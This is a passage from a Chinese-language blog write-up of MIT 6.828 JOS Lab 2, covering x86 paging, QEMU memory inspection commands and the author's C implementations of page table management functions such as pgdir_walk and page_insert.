位的线性地址有着这样的三段式结构：</p><p><img src="https://s2.loli.net/2022/03/15/3pScjrUCxOkwJA7.png" alt="image.png"></p><p>在 Cr3 寄存器中存放着页目录表的地址；MMU在将一个线性地址翻译成物理地址时，首先通过 Cr3 寄存器获取到页目录表地址，通过线性地址的 DIR 域找到页目录表对应下标的页目录表项（Page Directory Entry），页目录表项中存放着对应的页表的地址，再通过线性地址的 PAGE 域找到页表对应下标的页表项（Page Table Entry），页表项中存放着对应的物理页地址，最后通过 OFFSET 域（即页内偏移）访问到对应物理页的对应数据</p><p><img src="https://s2.loli.net/2022/03/15/bnYKURW1xPg7CHN.png" alt="image.png"></p><p>一个页（目录）表项有着如下的结构，由于页目录表、页表、物理页都是以页为单位对齐的，因此我们只需要存放以页为单位的地址即可，空闲下来的这些位被用以存放页访问、读写权限等</p><p><img src="https://s2.loli.net/2022/03/15/begX4uJNymUs92a.png" alt="image.png"></p><h3 id="Virtual-Linear-and-Physical-Addresses">Virtual, Linear, and Physical Addresses</h3><p>我们现在正式对一堆各种地址名词下定义：</p><ul><li>「虚拟地址」：基于分段机制表示的地址，由一个段选择子与段内偏移组成</li><li>「线性地址」：基于分页机制表示的地址，是经过了分段翻译后的一个地址</li><li>「物理地址」：RAM 上的真实地址</li></ul><p>得到如下转换图例：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">           Selector  +--------------+         +-----------+<br>          ----------&gt;|<span class="hljs-string">              </span>|<span class="hljs-string">         </span>|<span class="hljs-string">           </span>|<br>                     |<span class="hljs-string"> Segmentation </span>|<span class="hljs-string">         </span>|<span class="hljs-string">  Paging   </span>|<br>Software             |<span class="hljs-string">              </span>|<span class="hljs-string">--------&gt;</span>|<span class="hljs-string">           </span>|<span class="hljs-string">----------&gt;  RAM</span><br><span class="hljs-string">            Offset   </span>|<span class="hljs-string">  Mechanism   </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> Mechanism </span>|<br>          ----------&gt;|<span class="hljs-string">              </span>|<span class="hljs-string">         </span>|<span class="hljs-string">           </span>|<br>                     +--------------+         +-----------+<br>            Virtual                   Linear                Physical<br></code></pre></td></tr></table></figure><p>其实在分页机制出现之后，分段机制就没有什么存在的意义了，因此你可以看到现代操作系统基本上都很少提分段的概念，大部分情况下虚拟地址就直接是线性地址（当然，其实还是有一些地方用到分段的权限验证等特性的）</p><p>同样地，为了简化地址翻译的操作，在 <code>boot/boot.S</code> 中 JOS <strong>初始化了一个所有的段描述符都对应段基址 0、段界限 0xffffffff 的全局段描述符表</strong>，这样虚拟地址实际上就直接是线性地址了</p><p>下面来看 Exercise 3，主要让我们熟悉 Qemu 提供的一些查看内存的指令</p><blockquote><p><strong>Exercise 3.</strong> While GDB can only access QEMU’s memory by virtual address, it’s often useful to be able to inspect physical memory while setting up virtual memory. Review the QEMU <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html#qemu">monitor commands</a> from the lab tools guide, especially the <code>xp</code> command, which lets you inspect physical memory. To access the QEMU monitor, press Ctrl-a c in the terminal (the same binding returns to the serial console).</p><p>Use the xp command in the QEMU monitor and the x command in GDB to inspect memory at corresponding physical and virtual addresses and make sure you see the same data.</p><p>Our patched version of QEMU provides an info pg command that may also prove useful: it shows a compact but detailed representation of the current page tables, including all mapped memory ranges, permissions, and flags. Stock QEMU also provides an info mem command that shows an overview of which ranges of virtual addresses are mapped and with what permissions.</p></blockquote><p>先按 <code>Ctrl + A</code>，然后再按 <code>C</code>，进入 Qemu 的 monitor 模式，使用 <code>info pg</code> 指令查看分页映射，如下：</p><p><img src="https://s2.loli.net/2022/03/15/FlrKz6RbmSIBQf4.png" alt="image.png"></p><p>使用 <code>xp</code> 命令查看对应物理内存上数据与两个映射的虚拟地址上数据，完全一致</p><p><img src="https://s2.loli.net/2022/03/15/hupwIHRkyqefoD3.png" alt="image.png"></p><p>最后是 <code>info mem</code> 查看地址空间权限，虚拟地址空间起始 4MB 仅为可读权限，位于虚拟地址高 256MB 的起始 4MB 为可读写权限，<strong>但实际上对应的都是同一块物理地址空间</strong></p><p><img src="https://s2.loli.net/2022/03/15/N8nMTkh6Pgqlj5m.png" alt="image.png"></p><p>继续往下，在 JOS 中定义了两个 <code>uint32_t</code> 的别名 <code>uintptr_t</code> 与 <code>physaddr_t</code> 表示虚拟地址与物理地址（在编译器看来其实没有什么区别）</p><table><thead><tr><th>C type</th><th>Address type</th></tr></thead><tbody><tr><td><code>T*</code></td><td>Virtual</td></tr><tr><td><code>uintptr_t</code></td><td>Virtual</td></tr><tr><td><code>physaddr_t</code></td><td>Physical</td></tr></tbody></table><p>接下来是 MIT 6.828 的一个小习题：</p><blockquote><p><strong>Question</strong></p><ol><li>Assuming that the following JOS kernel code is correct, what type should variable <code>x</code> have, <code>uintptr_t</code> or <code>physaddr_t</code>?</li></ol><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">mystery_t x<span class="hljs-comment">;</span><br>char* value <span class="hljs-operator">=</span> return_a_pointer()<span class="hljs-comment">;</span><br>*value <span class="hljs-operator">=</span> <span class="hljs-number">10</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> (mystery_t) value<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></blockquote><p>我们知道虚拟地址是可以通过 MMU 进行翻译访问到物理地址的，但是一个物理地址经过 MMU 之后得到的可能是奇形怪状的东西（比如说物理地址同值的虚拟地址已经建立了一个映射），所以这里的 x 应当是 <code>uintptr_t</code> 类型</p><h3 id="Reference-counting">Reference counting</h3><p>在用以表示单个物理页框的 <code>PageInfo</code> 结构体中的成员 <code>pp_ref</code> 用以表示一张页面被引用的次数（引用计数），引用计数为 0 时表示该页为空闲页，但是引用计数的增/减<strong>应当由使用者完成</strong>，因此在我们调用 <code>page_alloc()</code> 之后应当立即将引用计数 + 1，而当引用计数为 0 时我们才应当调用 <code>page_free()</code> 释放一张内存页</p><blockquote><p>最后这个工作 JOS 归并在 <code>page_decref()</code> 中完成</p></blockquote><h3 id="Page-Table-Management">Page Table Management</h3><p>接下来是 Exercise4，让我们完成对页表的管理，补全对应函数</p><blockquote><p><strong>Exercise 4.</strong> In the file <code>kern/pmap.c</code>, you must implement code for the following functions.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pgdir_walk</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">boot_map_region</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">page_lookup</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">page_remove</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">page_insert</span><span class="hljs-params">()</span></span><br><br></code></pre></td></tr></table></figure><p><code>check_page()</code>, called from <code>mem_init()</code>, tests your page table management routines. You should make sure it reports success before proceeding.</p></blockquote><h4 id="pgdir-walk-：（创建并）返回-PTE">pgdir_walk()：（创建并）返回 PTE</h4><p>按惯例先看注释，对于一个给定的页目录表地址与一个线性地址，该函数应当返回对应的「页表项」的地址，若对应的页表为空且指定了 <code>create</code> 标志位，则分配一张新的物理页作为新的页表，若否、或是分配物理页失败则直接返回 NULL；分配成功后应当增加该页的引用计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Given &#x27;pgdir&#x27;, a pointer to a page directory, pgdir_walk returns</span><br><span class="hljs-comment">// a pointer to the page table entry (PTE) for linear address &#x27;va&#x27;.</span><br><span class="hljs-comment">// This requires walking the two-level page table structure.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// The relevant page table page might not exist yet.</span><br><span class="hljs-comment">// If this is true, and create == false, then pgdir_walk returns NULL.</span><br><span class="hljs-comment">// Otherwise, pgdir_walk allocates a new page table page with page_alloc.</span><br><span class="hljs-comment">//    - If the allocation fails, pgdir_walk returns NULL.</span><br><span class="hljs-comment">//    - Otherwise, the new page&#x27;s reference count is incremented,</span><br><span class="hljs-comment">//the page is cleared,</span><br><span class="hljs-comment">//and pgdir_walk returns a pointer into the new page table page.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint 1: you can turn a PageInfo * into the physical address of the</span><br><span class="hljs-comment">// page it refers to with page2pa() from kern/pmap.h.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint 2: the x86 MMU checks permission bits in both the page directory</span><br><span class="hljs-comment">// and the page table, so it&#x27;s safe to leave permissions in the page</span><br><span class="hljs-comment">// directory more permissive than strictly necessary.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint 3: look at inc/mmu.h for useful macros that manipulate page</span><br><span class="hljs-comment">// table and page directory entries.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>参照源码其他地方的相关写法，利用 JOS 提供的一些宏很容易就能补完该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pte_t</span> *<br><span class="hljs-title function_">pgdir_walk</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *va, <span class="hljs-type">int</span> create)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">int</span> pde_idx;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">new_page_table_page</span>;</span><br><span class="hljs-type">pte_t</span> *page_table;<br><br><span class="hljs-keyword">if</span> (!pgdir)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// create page table if not exist</span><br>pde_idx = PDX(va);<br><span class="hljs-keyword">if</span> (!pgdir[pde_idx] || !(pgdir[pde_idx] &amp; PTE_P))<br>&#123;<br><span class="hljs-keyword">if</span> (create)<br>&#123;<br>new_page_table_page = page_alloc(ALLOC_ZERO);<br><span class="hljs-keyword">if</span> (!new_page_table_page)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>new_page_table_page-&gt;pp_ref++;<br>pgdir[pde_idx] = (<span class="hljs-type">pde_t</span>) (page2pa(new_page_table_page) | PTE_P | PTE_W | PTE_U);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// align to PGSIZE</span><br>page_table = (<span class="hljs-type">pte_t</span>*) ((<span class="hljs-type">uint32_t</span>) KADDR(pgdir[pde_idx]) &amp; (~(PGSIZE - <span class="hljs-number">1</span>)));<br><br><span class="hljs-keyword">return</span> &amp;page_table[PTX(va)];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="boot-map-region-：建立虚拟地址区域到物理地址区域映射">boot_map_region()：建立虚拟地址区域到物理地址区域映射</h4><p>惯例先看注释，主要是建立虚拟地址 <code>[va, va+size)</code> 到物理地址 <code>[pa, pa+size)</code> 之间的映射，提示我们使用 <code>pgdir_walk()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Map [va, va+size) of virtual address space to physical [pa, pa+size)</span><br><span class="hljs-comment">// in the page table rooted at pgdir.  Size is a multiple of PGSIZE, and</span><br><span class="hljs-comment">// va and pa are both page-aligned.</span><br><span class="hljs-comment">// Use permission bits perm|PTE_P for the entries.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function is only intended to set up the ``static&#x27;&#x27; mappings</span><br><span class="hljs-comment">// above UTOP. As such, it should *not* change the pp_ref field on the</span><br><span class="hljs-comment">// mapped pages.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: the TA solution uses pgdir_walk</span><br></code></pre></td></tr></table></figure><p>对应写入页表项条目即可，注意这里不需要改变页的引用计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">boot_map_region</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">uintptr_t</span> va, <span class="hljs-type">size_t</span> size, <span class="hljs-type">physaddr_t</span> pa, <span class="hljs-type">int</span> perm)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">size_t</span> i;<br><span class="hljs-type">pte_t</span> *cur_pte;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; size / PGSIZE; i++)<br>&#123;<br>cur_pte = pgdir_walk(pgdir, (<span class="hljs-type">void</span> *)(va + i * PGSIZE), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!cur_pte)<br>panic(<span class="hljs-string">&quot;out of memory while creating page table!&quot;</span>);<br>*cur_pte = (<span class="hljs-type">pte_t</span>) ((pa + i * PGSIZE) | PTE_P | perm);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-lookup-：返回虚拟地址对应-PageInfo-地址">page_lookup()：返回虚拟地址对应 PageInfo 地址</h4><p>主要是让我们查找页表，返回虚拟地址对应的 PageInfo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Return the page mapped at virtual address &#x27;va&#x27;.</span><br><span class="hljs-comment">// If pte_store is not zero, then we store in it the address</span><br><span class="hljs-comment">// of the pte for this page.  This is used by page_remove and</span><br><span class="hljs-comment">// can be used to verify page permissions for syscall arguments,</span><br><span class="hljs-comment">// but should not be used by most callers.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Return NULL if there is no page mapped at va.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: the TA solution uses pgdir_walk and pa2page.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>直接用前面写的 <code>pgdir_walk()</code> 找到页表项再用 <code>pa2page()</code> 把物理地址转成 PageInfo 的虚拟地址即可，JOS 还提供了一个方便的页表项到物理地址转化的宏 <code>PTE_ADDR()</code> （一开始笔者都是纯手写…）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> PageInfo *<br><span class="hljs-title function_">page_lookup</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">void</span> *va, <span class="hljs-type">pte_t</span> **pte_store)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">pte_t</span> *pte;<br><br>pte = pgdir_walk(pgdir, va, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (pte_store)<br>*pte_store = pte;<br>    <br>    <span class="hljs-comment">// page not present</span><br><span class="hljs-keyword">if</span> (!pte || !((*pte) &amp; PTE_P))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> pa2page(PTE_ADDR(*pte));<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-remove-：解除页表虚拟地址映射">page_remove()：解除页表虚拟地址映射</h4><p>主要是解除页表上对应虚拟地址到物理地址间的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Unmaps the physical page at virtual address &#x27;va&#x27;.</span><br><span class="hljs-comment">// If there is no physical page at that address, silently does nothing.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Details:</span><br><span class="hljs-comment">//   - The ref count on the physical page should decrement.</span><br><span class="hljs-comment">//   - The physical page should be freed if the refcount reaches 0.</span><br><span class="hljs-comment">//   - The pg table entry corresponding to &#x27;va&#x27; should be set to 0.</span><br><span class="hljs-comment">//     (if such a PTE exists)</span><br><span class="hljs-comment">//   - The TLB must be invalidated if you remove an entry from</span><br><span class="hljs-comment">//     the page table.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: The TA solution is implemented using page_lookup,</span><br><span class="hljs-comment">// tlb_invalidate, and page_decref.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>清空页表项并减少引用计数即可，若引用计数为 0 则释放该页，别忘了使用 <code>tlb_invalidate()</code> 清除 TLB 中缓存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_remove</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">void</span> *va)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span>;</span><br><br> <span class="hljs-comment">// get the PageInfo and PTE</span><br>pp = page_lookup(pgdir, va, &amp;pte);<br><span class="hljs-keyword">if</span> (pp)<br>&#123;<br><span class="hljs-comment">// clear PTE</span><br>tlb_invalidate(pgdir, va);<br>*pte = (<span class="hljs-type">pte_t</span>) <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// decrease refcount</span><br>page_decref(pp);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-insert-：建立虚拟地址到物理页映射">page_insert()：建立虚拟地址到物理页映射</h4><p>建立单个虚拟地址到单张物理页上的映射，分配并增加页引用计数，若已有一个映射则移除现有映射并清空 TLB 对应条目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Map the physical page &#x27;pp&#x27; at virtual address &#x27;va&#x27;.</span><br><span class="hljs-comment">// The permissions (the low 12 bits) of the page table entry</span><br><span class="hljs-comment">// should be set to &#x27;perm|PTE_P&#x27;.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Requirements</span><br><span class="hljs-comment">//   - If there is already a page mapped at &#x27;va&#x27;, it should be page_remove()d.</span><br><span class="hljs-comment">//   - If necessary, on demand, a page table should be allocated and inserted</span><br><span class="hljs-comment">//     into &#x27;pgdir&#x27;.</span><br><span class="hljs-comment">//   - pp-&gt;pp_ref should be incremented if the insertion succeeds.</span><br><span class="hljs-comment">//   - The TLB must be invalidated if a page was formerly present at &#x27;va&#x27;.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Corner-case hint: Make sure to consider what happens when the same</span><br><span class="hljs-comment">// pp is re-inserted at the same virtual address in the same pgdir.</span><br><span class="hljs-comment">// However, try not to distinguish this case in your code, as this</span><br><span class="hljs-comment">// frequently leads to subtle bugs; there&#x27;s an elegant way to handle</span><br><span class="hljs-comment">// everything in one code path.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// RETURNS:</span><br><span class="hljs-comment">//   0 on success</span><br><span class="hljs-comment">//   -E_NO_MEM, if page table couldn&#x27;t be allocated</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: The TA solution is implemented using pgdir_walk, page_remove,</span><br><span class="hljs-comment">// and page2pa.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>官方推荐用 <code>page_remove()</code> 完成对现有页的解引用，但是会重复调用 <code>pgdir_walk()</code>，所以笔者直接展开操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">page_insert</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-keyword">struct</span> PageInfo *pp, <span class="hljs-type">void</span> *va, <span class="hljs-type">int</span> perm)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">old_pp</span>;</span><br><br> <span class="hljs-comment">// get pte of va, create it if not exist</span><br>pte = pgdir_walk(pgdir, va, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!pte)<br><span class="hljs-keyword">return</span> -E_NO_MEM;<br><br><span class="hljs-comment">// page already present, dereference it</span><br><span class="hljs-keyword">if</span> ((*pte) &amp; PTE_P)<br>&#123;<br>old_pp = pa2page(PTE_ADDR(*pte));<br><br><span class="hljs-comment">// if insert the same, just set the perm and return</span><br><span class="hljs-keyword">if</span> (old_pp == pp)<br>&#123;<br>*pte = page2pa(pp) | perm | PTE_P;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// clear PTE</span><br>tlb_invalidate(pgdir, va);<br>*pte = (<span class="hljs-type">pte_t</span>) <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// decrease refcount</span><br>page_decref(old_pp);<br>&#125;<br><br>pp-&gt;pp_ref++;<br>*pte = page2pa(pp) | perm | PTE_P;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里时运行 lab2 的分数检查程序应该有 40 分了</p><h2 id="Part-3-Kernel-Address-Space">Part 3: Kernel Address Space</h2><p>kernel 占据高 256MB的虚拟地址空间而 user 使用剩余的虚拟地址空间</p><h3 id="Permissions-and-Fault-Isolation">Permissions and Fault Isolation</h3><p>因为一张页目录表同时映射了用户空间与内核空间，因此我们需要通过页表中的权限位限制用户对一些地址空间的访问：</p><ul><li>对于 <code>ULIM</code> 往高地址的内存，用户无权访问</li><li>对于 <code>[UTOP, ULIM)</code> 这块区域的内存，用户与内核都<strong>只有只读权限</strong>，这块区域的映射将页表、PageInfo 数组等结构暴露给用户，但只有位于内核空间的映射可以写入页表与 PageInfo 数组</li></ul><h3 id="Initializing-the-Kernel-Address-Space">Initializing the Kernel Address Space</h3><p>接下来是 Exercise 5：完成 <code>mem_init()</code> 的剩余部分</p><blockquote><p><strong>Exercise 5.</strong> Fill in the missing code in <code>mem_init()</code> after the call to <code>check_page()</code>.</p><p>Your code should now pass the <code>check_kern_pgdir()</code> and <code>check_page_installed_pgdir()</code> checks.</p></blockquote><h4 id="mem-init-：（part2）">mem_init()：（part2）</h4><p>目光放回 <code>mem_init()</code>，接下来又到了该我们补全的地方：将 pages 映射到线性地址 <code>UPAGES</code> 上，新建映射的权限应为用户与内核都可读，但 pages 结构体应当为内核可读写而用户不可知，因此应当建立新的映射，这里该用上我们之前写的 <code>boot_map_region()</code> 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Now we set up virtual memory</span><br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Map &#x27;pages&#x27; read-only by the user at linear address UPAGES</span><br><span class="hljs-comment">// Permissions:</span><br><span class="hljs-comment">//    - the new image at UPAGES -- kernel R, user R</span><br><span class="hljs-comment">//      (ie. perm = PTE_U | PTE_P)</span><br><span class="hljs-comment">//    - pages itself -- kernel RW, user NONE</span><br><span class="hljs-comment">// Your code goes here:</span><br>boot_map_region(kern_pgdir, UPAGES, <br>ROUNDUP(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> PageInfo) * npages, PGSIZE), PADDR(pages), <br>PTE_U);<br></code></pre></td></tr></table></figure><p>然后到初始化内核栈了，这里内核栈被分为两块：</p><ul><li>常规的可读写内核栈</li><li>内核栈保护页面，读写到该页面上时说明栈爆了，称为 guard page</li></ul><p>guard page 不需要我们建立新的映射，因为如果爆栈了读写到 guard page 自然会触发 page fault，这时我们便知道爆栈了</p><p>需要注意内核栈应仅为内核可读写，应设置页表项的 Supervisor 权限位，即不使用 <code>PTE_U</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span 